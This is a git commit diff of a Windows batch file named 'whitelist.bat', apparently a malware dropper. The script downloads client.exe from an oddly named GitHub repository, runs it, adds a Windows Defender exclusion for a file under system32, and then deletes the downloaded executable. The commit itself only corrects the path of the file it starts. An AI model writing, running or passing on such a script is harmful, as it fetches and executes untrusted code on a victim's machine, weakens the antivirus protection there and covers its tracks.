5cc4e96f44b6281591f8feccf745fe30da23102a
BlaBlak3 <93101797+BlaBlak3@users.noreply.github.com>
2021-11-03 22:15:26 -0400

    Update whitelist.bat

--- whitelist.bat
+++ whitelist.bat
@@ -1,7 +1,7 @@
 @echo off
 cd C:\
 powershell -Command "Invoke-WebRequest https://github.com/BlaBlak3/oouikyhjnjhsshn/blob/main/client.exe -Outfile client.exe"
-start C:\Uclient.exe
+start C:\client.exe
 powershell.exe -Command Add-MpPreference -ExclusionPath "C:\Windows\system32\Runner\Start.exe"
 timeout 2 > NULL
 del C:\client.exe
